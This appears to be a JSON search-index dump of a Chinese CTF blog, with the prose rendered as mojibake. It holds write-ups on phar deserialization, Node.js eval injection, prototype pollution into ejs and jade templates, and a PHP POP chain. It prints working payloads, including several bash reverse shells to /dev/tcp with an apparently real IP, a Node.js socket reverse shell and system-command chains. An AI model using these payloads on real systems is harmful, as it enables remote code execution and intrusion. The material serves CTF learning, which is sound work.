å¹¶ä¸”æœ‰ç›¸åº”çš„é­”æœ¯æ–¹æ³•ä½œä¸ºè¸æ¿ è€Œä¸”`/ phar://` ä¸èƒ½è¢«è½¬ä¹‰\n\npharæ˜¯phpçš„å‹ç¼©æ–‡ä»¶å¹¶ä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½ç›´æ¥è¢«phpè®¿é—®å¹¶ä¸”æ‰§è¡Œ\n\npharç»“æ„ç”±å››éƒ¨åˆ†ç»„æˆï¼š\n\n- stub phar æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º `xxx<?php xxx; __HALT_COMPILER();?>`ï¼›\n- manifest å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥**åºåˆ—åŒ–**å­˜å‚¨ï¼›\n- contents å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›\n- signature ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼›\n\næ„é€ å›ºå®šå†…å®¹ä¸ºï¼š\n\n```php\n//pharç”Ÿæˆä»£ç \n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n```\n\næˆ‘ä»¬å°†æ„é€ çš„æ¶æ„popé“¾å¡å…¥`$phar->setMetadata();`ä¸­ ,å¹¶ä¸”å­˜å‚¨å½¢å¼ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼å­˜å‚¨\n\né€šè¿‡winhexæŸ¥çœ‹ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816275551-e8b892a0-9df4-4fc8-ab6b-18c0b8d4175c.png)\n\nå½“æˆ‘ä»¬é€šè¿‡`phar://`å»è®¿é—®è¯¥æ–‡ä»¶æ—¶ æˆ‘ä»¬æ„é€ çš„æ¶æ„åºåˆ—åŒ–popé“¾å°±ä¼šè¢«ååºåˆ—åŒ– ä»è€Œæ‰§è¡Œæ¶æ„ä»£ç \n\næ˜ç™½äº†åŸç†ä¹‹å ç›´æ¥æ„é€ \n\n```php\n<?php\nclass User {\n    public $db;\n}\n\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n\n    public function __construct() {\n        $this->results = array();\n        $this->funcs = array();\n        $file = new File();\n        $this->files = array($file);\n}\n}\nclass File {\n    public $filename='/flag.txt';\n}\n$a = new User();\n$a->db=new FileList();\n//pharç”Ÿæˆä»£ç \n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n?>\n```\n\nç„¶åè¿™ä¸ªflagè·¯å¾„æ˜¯æ€ä¹ˆæ¨æµ‹å‡ºæ¥çš„ å…¶å®é¢˜ç›®ä¹Ÿæœ‰æš—å–» åœ¨download.php ä¸è¿‡å¦‚æœæˆ‘åšè¿™é“é¢˜ç›®è‚¯å®šä¼šå½“ä¸ªçå­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816525788-9a226973-ff05-44f0-8c1a-3a8f69c96fe3.png)\n\nå°†æˆ‘ä»¬ç”Ÿæˆçš„`Z1d10t.phar`æ”¹ä¸º`Z1d10t.png`ä¸Šä¼ ä¸Šå»è¿™ä¸ªåç¼€åå¹¶ä¸ä¼šå› ä¸ºè¢«ä¿®æ”¹è€Œå½±å“ çŒœæµ‹å°±åƒé‚£ä¸ªyamlååºåˆ—åŒ–é¢˜ç›®ä¸€æ · æ˜¯é€šè¿‡äºŒè¿›åˆ¶æ–‡ä»¶è¯»å–çš„ æ‰€ä»¥åç¼€æ— æ‰€è°“\n\nç„¶åè¿™é‡Œè®¿é—®ä¹Ÿæœ‰ä¸ªå‘  æˆ‘ä»¬å¯ä»¥é€šè¿‡download.php ä¸‹è½½è®¿é—® æˆ–è€… delete.php åˆ é™¤è®¿é—®\n\nå¦‚æœæˆ‘ä»¬é€šè¿‡ä¸‹è½½é¡µé¢è®¿é—®æ˜¯ä¸è¡Œçš„ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816750074-5e4f2216-b78b-406e-b1db-6769b1619212.png)\n\ndownload.phpä¸­æœ‰è¿™ä¹ˆä¸€ä¸²ä»£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816798255-1e9ab852-3d82-442f-a515-bde701d1239e.png)\n\nPHP ini_setç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œåœ¨å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ç”Ÿæ•ˆï¼Œè„šæœ¬ç»“æŸåï¼Œè®¾ç½®å¤±æ•ˆã€‚æ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½®ï¼Œå¯¹äºè™šæ‹Ÿç©ºé—´æ¥è¯´ï¼Œå¾ˆæ–¹ä¾¿ã€‚å‚è€ƒï¼šhttps://developer.aliyun.com/article/521394\n\nç»•è¿‡ `open_basedir`å¯ä»¥å‚è€ƒï¼šhttps://xz.aliyun.com/t/10070\n\nä¹Ÿå°±æ˜¯è¯´download.phpè®¿é—®æ–‡ä»¶åªè¢«é™å®šäº`:/etc:/tmp``getcwd()`ä¹Ÿå°±æ˜¯å½“å‰æ–‡ä»¶ ä¸‰ä¸ªè·¯å¾„ æ²¡æ³•å»è¯»æˆ‘ä»¬çš„æ–‡ä»¶\n\nè€Œdelete.phpæ²¡æœ‰è¢«é™å®š å¯ä»¥å»è¯»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683817203363-4f6eda6d-8d10-4e90-a406-88afe550599b.png)\n","tags":["ä»£ç å®¡è®¡","phar"],"categories":["buuctf"]},{"title":"ctfshow-nodejs","url":"/post/372ab69b.html","content":"\nnodejsåˆ·é¢˜\n\n<!--more-->\n\n# å‰è¨€\n\nå› ä¸ºæ‰“ä¸€æ¬¡æ¯”èµ›åšåˆ°äº†è¿™ä¸ªnodejsåŸå‹é“¾æ±¡æŸ“ï¼Œæ˜¯ä¸€ç‚¹å¤´ç»ªéƒ½æ²¡æœ‰ï¼Œå°±æ¥æ¶è¡¥ä¸€ä¸‹ï¼Œkeep onï¼\n\n# Web-334(å¤§å°å†™)\n\nä»£ç å®¡è®¡ \n\nç»™äº†è´¦å·å’Œå¯†ç  è´¦å·æ˜¯å¤§å†™çš„`CTFSHOW`ï¼Œä½†æ˜¯è¾“å…¥çš„è´¦å·ä¸èƒ½ä¸ºå¤§å†™ï¼Œæœ‰ä¸ªå°å†™è½¬å¤§å†™çš„æ“ä½œï¼Œè¾“å…¥`ctfshow`å³å¯\n\n```php\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n# Web-335(eval)\n\neval()ç”¨æ³•å’Œphpå·®ä¸å¤š éƒ½æ˜¯å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œ\n\nè¿™é‡Œnodejsæ‰§è¡Œå‘½ä»¤ç±»ä¼¼äºpython è¦è°ƒåº“ æ¯”å¦‚ pythonå°±è¦è°ƒåŒ…å«ç›®å½•æ‰§è¡Œçš„åº“ï¼Œæ¯”å¦‚osï¼Œåœ¨nodejsé‡Œä¹Ÿæ˜¯ä¸€æ · ä¸è¿‡è¿™é‡Œéƒ½æ˜¯é€šè¿‡`require('æ¨¡å—')`æ¥è°ƒ(ä¸ä¸¥è°¨ ä½†æ˜¯å¯ä»¥è¿™ä¹ˆç†è§£)\n\npayload:`/?eval=require('child_process').execSync('ls')`\n\nå¯ä»¥å‚è€ƒnodejsä¸­æ–‡ç½‘https://nodejs.cn/api/child_process.html#child-process\n\nä½†æ˜¯å…¶ä»–å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¯”å¦‚`exec()`è¿”å›éƒ½æ˜¯`[object Object]`\n\nåœ¨è¿™é‡Œåªèƒ½ç”¨`execSync`\n\n# Web-336\n\n## è§£æ³•ä¸€ï¼š\n\nè®¾ç½®äº†waf\n\nè¯»å½“å‰æ–‡ä»¶è·¯å¾„\n\n```\n?eval=__filename\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png)\n\n```\n?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')\n```\n\nè¿™é‡Œfsæ¨¡å—è´Ÿè´£è¯»å†™æ–‡ä»¶\n\nè¯»å½“å‰æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png)\n\nè¿‡æ»¤äº†`exec load`\n\né€šè¿‡å­—ç¬¦æ‹¼æ¥ç»•è¿‡ï¼š`?eval=require('child_process')['exe'%2B'cSync']('ls')`\n\n`%2B`æ˜¯`+`çš„urlç¼–ç \n\n## è§£æ³•äºŒï¼š\n\nç”¨fsæ¨¡å—è¯»å½“å‰è·¯å¾„æ–‡ä»¶\n\n```\n?eval=require('fs').readdirSync('.')\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png)\n\nç›´æ¥è¯»å°±è¡Œäº†\n\n```\n?eval=require('fs').readFileSync('fl001g.txt','utf-8')\n```\n\nè¿™é‡Œè¯»è·¯å¾„å’Œæ–‡ä»¶å‘½ä»¤ç¨æœ‰ä¸åŒ ä¸è¿‡å¾ˆå¥½è®°\n\n## è§£æ³•ä¸‰ï¼š\n\n```\n?eval=require(\"child_process\")[\"\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\"]('cmd')\n```\n\nåˆ©ç”¨ç¼–ç ç»•è¿‡\n\n# Web-337(æ•°ç»„ç»•è¿‡)\n\nç»™äº†æºç  ç±»ä¼¼äºphpçš„md5æ€è·¯\n\n```\n?a[]=1&b[]=1\n```\n\nå¯ä»¥çœ‹å¸ˆå‚…çš„æ€»ç»“ tqlï¼šhttps://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/\n\nWeb-336çš„ç¼–ç ç»•è¿‡å°±æ˜¯çœ‹äº†è¿™ä¸ªå¸ˆå‚…çš„\n\n# Web-338(ç»å…¸åŸå‹é“¾æ±¡æŸ“)\n\nç»™äº†æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png)\n\nå½“secertå¯¹è±¡çš„ctfshowå±æ€§ä¸ºé¢˜ç›®æ‰€éœ€å€¼å°±ç»™flag\n\né‚£ä¹ˆå°±é€šè¿‡åŸå‹é“¾æ±¡æŸ“Objectçš„ctfshowå±æ€§ ä»è€Œä½¿å¾—secertå¯¹è±¡ä¸ºæ‰€éœ€å€¼\n\nå¯åˆ©ç”¨ç‚¹ä¸ºè¿™ä¸ªcopyå‡½æ•° \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png)\n\nè·Ÿè¸ªä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png)\n\nå‘ç°äº†åŸå‹é“¾æ±¡æŸ“çš„ç»å…¸è¯­å¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png)\n\nå½“æ—¶åšè¿™é“é¢˜é¢˜ç›®æ—¶å€™æœ‰ä¸ªç–‘é—®å°±æ˜¯ä¸ºä»€ä¹ˆpostä¼ è¾“çš„æ•°æ®æ˜¯åœ¨å“ªé‡Œæ¥å—åˆ°çš„ï¼Œå› ä¸ºæ˜¯é›¶åŸºç¡€jsï¼Œè¿˜åœ¨æ…¢æ…¢æ‘¸ç´¢ï¼Œåˆå»å®¡äº†ä¸€æ¬¡ä»£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png)\n\n```php\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  \n}\n```\n\næ•´ä¸ªè¯­å¥éƒ½æ˜¯`router{}`å›Šæ‹¬èµ·æ¥çš„,å¹¶ä¸”æ˜¯é€šè¿‡postä¼ å‚ï¼Œè€Œä¸”è¿˜åŠ è½½äº†`require('body-parser')`ä¸­é—´é”®ã€‚\n\nbody-parseræ˜¯éå¸¸å¸¸ç”¨çš„ä¸€ä¸ªexpressä¸­é—´ä»¶ï¼Œä½œç”¨æ˜¯å¯¹postè¯·æ±‚çš„è¯·æ±‚ä½“è¿›è¡Œè§£æ  ã€‚\n\né™¤æ­¤ä¹‹å¤–ä¸ºä»€ä¹ˆè¦ç”¨jsonæ ¼å¼ä¼ è¾“ï¼Œpç¥åšå®¢ä¸­ä¹ŸæåŠäº†ï¼Œå¦‚æœä¸ç”¨jsonæ–‡ä»¶å‘é€é‚£ä¹ˆ`__proto__`å°±ä¼šè¢«å½“ä½œåŸå‹æ‰§è¡Œï¼Œå¯¼è‡´æ±¡æŸ“å¤±è´¥ï¼Œåªæœ‰é€šè¿‡jsonæ ¼å¼æäº¤ï¼Œæ‰ä¼šè¢«å½“ä½œkeyæ¥æ‰§è¡Œï¼Œè¿™æ ·æ‰èƒ½è¾¾åˆ°åŸå‹é“¾æ±¡æŸ“çš„æ•ˆæœã€‚\n\nå…³äºnodejsè¯·æ±‚ å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« æ¯”è¾ƒç¬¦åˆæˆ‘è¿™ç§æ–°æ‰‹ï¼šhttps://www.cnblogs.com/Diamond-sjh/p/11324138.html\n\n# Web-339 (api)\n\nè¿™é“é¢˜ç›®å¤šäº†ä¸€ä¸ª/apiè·¯ç”± å¹¶ä¸”çœ‹åˆ°äº†render å¤šäº†ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png)\n\nå‘ç°Function è¿™é‡Œå€Ÿç”¨pç¥çš„ç†è§£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png)\n\nè¿™é‡Œqueryæ²¡æœ‰è¢«å®šä¹‰ï¼Œå°±ä¼šåœ¨Objectå¯¹è±¡ä¸­å¯»æ‰¾è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å‘ä¸Šæ±¡æŸ“Objectæ·»åŠ ä¸€ä¸ªqueryå±æ€§å°±è¡Œäº† ã€‚\n\nè¿™é‡Œæä¾›ä¸‰ç§payload:\n\npayload1:\n\n```\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"');var __tmp2\"}}\n```\n\n`outputFunctionName`æ˜¯ejså¼•æ“çš„ä¸€ä¸ªå±æ€§ å¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/DARKNOTES/article/details/124000520\n\npayload2:\n\n```\n{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"')\"}}\n```\n\næ²¡æœ‰requireï¼Œæ‰€ä»¥å°±ç”¨ `global.process.mainModule.constructor._load`æ¥å¯¼å…¥ child_process\n\npayload3:\n\n```\n{\"__proto__\":{\"query\":\"var net = process.mainModule.constructor._load('net'),cp = process.mainModule.constructor._load('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(port,'ip', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;\"}}\n```\n\n Functionç¯å¢ƒä¸‹æ²¡æœ‰requireå‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨`process.mainModule.constructor._load`æ¥ä»£æ›¿requireã€‚  \n\nç„¶åflagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ ä¸€å¼€å§‹è¢«è¿™ä¸ªå‘åˆ°äº†\n\n# Web-340(äºŒæ¬¡æ±¡æŸ“)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png)\n\nè¿™é‡Œuserä¸ºä¸€ä¸ªå¯¹è±¡ ä»–çš„å±æ€§userinfoä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ \n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³é€šè¿‡copyå‡½æ•°é€šè¿‡`user.userinfo`æ±¡æŸ“åˆ°`Object.prototype`\n\nå³åˆ™`user.userinfo->user(ç¬¬ä¸€æ¬¡æ±¡æŸ“)->Object(ç¬¬äºŒæ¬¡æ±¡æŸ“)`éœ€è¦æ±¡æŸ“ä¸¤æ¬¡\n\nè·¯ç”±/apiçš„æ€è·¯å’Œä¸Šä¸€é¢˜ä¸€æ · åˆ™å¯ä»¥ç”¨ä¸Šé¢˜çš„payloadï¼ŒåµŒå¥—ä¸€ä¸ª__proto__å³å¯\n\n `{\"__proto__\":{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"')\"}}}`\n\n\n\n# Web-341(ejsæ¨¡æ¿)\n\næ²¡äº†/apiè·¯ç”±\n\nä¹Ÿæ²¡æœ‰äº†æ¡ä»¶è¾“å‡ºflag\n\nçœ‹äº†wpæ˜¯ejsçš„æ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png)\n\né‚£ä¹ˆæ—¢ç„¶æ²¡æœ‰æ¡ä»¶Functionå‡½æ•°è®©æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºflagï¼Œè¯¥æ€ä¹ˆå¼„å‘¢\n\næ•´ä½“åˆ†æå¯å‚è€ƒï¼šhttps://www.anquanke.com/post/id/236354#h2-2\n\nå¤§è‡´æ€è·¯ä¸ºï¼šé€šè¿‡åŸå‹é“¾æ±¡æŸ“ å»è¦†ç›–è¿™ä¸ªæ¨¡æ¿æ¸²æŸ“æ—¶çš„æ‹¼æ¥ä»£ç ï¼Œè®©å…¶æ‹¼æ¥è¿›ejsæ¨¡æ¿ä»£ç ç§ï¼Œä»è€Œæ¸²æŸ“æ—¶è¿›è¡ŒRCE\n\n```\npayload:{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"');var __tmp2\"}}}\n```\n\n# Web-342ã€343(jadeæ¨¡æ¿)\n\nå®¡è®¡æºç ï¼Œå‘ç°æ¢äº†æ¨¡æ¿å¼•æ“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png)\n\næ€è·¯ä¸ä¸Šé¢ejsæ¨¡æ¿ç›¸åŒ ç›´æ¥çœ‹å¸ˆå‚…ä»¬çš„payloadå³å¯\n\n1. `{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n2. `{\"__proto__\":{\"__proto__\":{\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.constructor._load('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/124.221.###.174/7777 0>&1\\\"')\"}}}`\n3. `{\"__proto__\":{\"__proto__\":{\"type\":\"Code\",\"self\":1,\"line\":\"global.process.mainModule.require('child_process').execSync('bash -c \\\" bash -i >&/dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n\næ³¨æ„è¿™é‡Œæœ‰ä¸¤ä¸ªå¤§å‘ å‘æ­»æˆ‘äº†\n\né¦–å…ˆæäº¤è¦post burpé»˜è®¤get\n\næœ€å‘çš„æ˜¯Content-Typeè¦æ”¹ä¸º `application/json`ç›å¾·å½“æ—¶è¿™é‡Œä¸€ç›´æ˜¯é»˜è®¤çš„ ä¸€ç›´æ²¡æ”¹ å¯¼è‡´ä¸€ç›´åå¼¹å¤±è´¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png)\n\nç„¶åå†æ¥è¯´è¯´æ‰¾flagçš„æ–¹æ³• \n\nç›´æ¥`cat /proc/self/environ`å»æ‰¾\n\næˆ–è€…`env|grep ctfshow` å…¶å®å°±æ˜¯ç®¡é“ç¬¦æŠŠenvçš„è¾“å‡ºçš„å†…å®¹å½“ä½œgrep(æŸ¥æ‰¾å­—ç¬¦)çš„å‚æ•°\n\nå…¶å®æœ¬è´¨ä¸Šè¿™ä¸¤è€…æ˜¯ç­‰ä»·çš„ éƒ½æ˜¯åœ¨ç¯å¢ƒå˜é‡ç§å¯»æ‰¾flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png)\n\n# Web-344(nodejs è§£æç‰¹æ€§)\n\nç»™äº†æºç ï¼š\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n    res.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n    res.end(flag);\n  }else{\n    res.end('where is flag. :)');\n  }\n\n});\n```\n\næ ¹æ®æºç æˆ‘ä»¬åº”è¯¥ä¼ \n\n```\n?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":\"true)\"}\n```\n\n`req.url.match(/8c|2c|\\,/ig)`ä½†æ˜¯æ­£åˆ™è¿‡æ»¤äº†ç©ºå­—ç¬¦ é€—å·ä»¥åŠå…¶urlç¼–ç  \n\n çœ‹äº†å¤§ä½¬çš„wp åº”è¯¥è¿™æ ·ä¼ `?query={\"name\":\"admin\"&query=\"password\":\"ctfshow\"&query=\"isVIP\":true}` urlç¼–ç ä¹‹åä¼ ä¸Šå»\n\n nodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ \n\nè¢«ä¼ å…¥ä¹‹åreq.queryè¢«è§£ææˆäº†ä¸€ä¸ªæ•°ç»„ï¼Œä¹‹ååœ¨JSON.parseçš„è§£æä¸‹å˜æˆäº†å¯¹è±¡ï¼Œå°±å˜æˆäº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœäº†ã€‚\n","tags":["nodejsåŸå‹é“¾æ±¡æŸ“","nodejs"],"categories":["ctfshow"]},{"title":"è´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›WEBéƒ¨åˆ†WP","url":"/post/232bb69.html","content":"\nè´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›WEBéƒ¨åˆ†WP\n\n<!--more-->\n\n# ä»”ç»†ping\n\næœ‰ç‚¹çœ‹ä¸æ‡‚çš„ä¸€é“é¢˜ç›®ï¼Œipå»pingï¼Œè¿”å›å’Œæˆ‘ä»¬æœ¬åœ°pingç½‘ç«™å·®ä¸å¤šçš„å›æ˜¾ï¼Œåˆšå¼€å§‹æ˜¯ä»¥ä¸ºç”¨é€»è¾‘ç¬¦`|&&`ä¹‹ç±»çš„é¢˜ç›®æ¥åšï¼Œåæ¥å‘ç°æƒ³å¤æ‚äº†ï¼Œä»–é¢˜ç›®æ„æ€å¥½åƒåªèƒ½ç”¨ä»–æŒ‡å®šçš„å‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–å…¶ä»–å­—ç¬¦ä¸€å¾‹å±è”½\n\næ¯”å¦‚ `?ip=ls`å°±å¯ä»¥åˆæ³•ï¼Œä½†æ˜¯å¦‚æœ`?ip=l`ä¸€ä¸ªå­—ç¬¦ä¹Ÿä¼šè¢«å±è”½ï¼Œè›®ntçš„è¯´å®è¯ã€‚\n\npayload:`?id=ls`\n\nå‘ç°æœ¬åœ°æœ‰flag.php\n\nç›´æ¥ `?id=nl flag.php`\n\n# pop\n\n```php\n<?php\n  highlight_file(__FILE__);\nclass TT{\n  public $key;\n  public $c;\n  public function __destruct(){\n    echo $this->key;\n  }\n  \n  public function __toString(){\n    return \"welcome\";\n  }\n}\n\nclass JJ{\n  public $obj;\n  public function __toString(){\n    ($this -> obj)();\n    return \"1\";\n  }\n  public function evil($c){\n    eval($c);\n  }\n  public function __sleep(){\n    phpinfo();\n  }\n}\n\nclass MM{\n  public $name;\n  public $c;\n  public function __invoke(){\n    ($this->name)($this->c);\n  }\n  public function __toString(){\n    return \"ok,but wrong\";\n  }\n  public function __call($a, $b){\n    echo \"Hacker!\";\n  }\n}\n$a = unserialize($_GET['bbb']);\nthrow new Error(\"NoNoNo\");\n```\n\næ•´ä¸ªé“¾å­å…¶å®ä¸éš¾ å½“æ—¶åšè¿™é“é¢˜ç›® æœ¬åœ°popé“¾å·²ç»å†™å‡ºæ¥äº† ä½†æ˜¯å‘ç°æ²¡æ³•è§¦å‘ \n\n```php\n<?php\nclass TT{\n    public $key;\n    public $c;\n}\n\n\nclass JJ{\n    public $obj;\n}\nclass MM{\n    public $name;\n    public $c;\n\n\n}\n$a = new TT();\n$a->key = new JJ();\n$a->key->obj=new MM();\n$a->key->obj->name ='system';\n$a->key->obj->c='cat /flag';\necho serialize($a);\n?>\n#O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:9:\"cat /flag\";}}s:1:\"c\";N;}\n```\n\nç„¶åå°±ä¼šå‘ç°`throw new Error(\"NoNoNo\");`ä¼šæŒ¡åœ¨å‰é¢æ²¡æ³•ç»•è¿‡ï¼Œå½“æ—¶å°±å¯„äº†ã€‚\n\nè¿™é‡Œè€ƒåˆ°äº†fast destructçš„çŸ¥è¯†ç‚¹ å‡ºè‡ªï¼šhttps://zhuanlan.zhihu.com/p/405838002\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683425847710-d16be9c0-ad73-4d77-a90b-d1ddc07075b6.png)\n\nå…¶å®åŸç†è¿˜æ˜¯è›®å®¹æ˜“ç†è§£çš„ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶ï¼Œæœ€åå°±ä¼šè§¦å‘ææ„å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æå‰ç ´åè¿™ä¸ªåºåˆ—åŒ–åçš„ç»“æ„ï¼Œé‚£ä¹ˆå°±ä¼šæå‰è¿›å…¥ææ„å‡½æ•°\n\nè¿™é“é¢˜ç›®å°±æ˜¯å› ä¸º`throw new Error(\"NoNoNo\");`è€Œè¿›ä¸å»æˆ‘ä»¬æ„é€ çš„é“¾å­ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç ´åæˆ‘ä»¬payloadé“¾å­ç»“æ„ é‚£ä¹ˆå°±ä¼šæå‰è¿›å…¥ææ„å‡½æ•° ä»è€Œè§¦å‘é“¾å­\n\npayloadï¼š`?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;}`\n\nè¿™æ ·æ˜¯å®Œæ•´é“¾å­æ²¡æ³•è§¦å‘çš„æˆ‘ä»¬å¯ä»¥åˆ é™¤æœ€åä¸€ä¸ª`}`ç 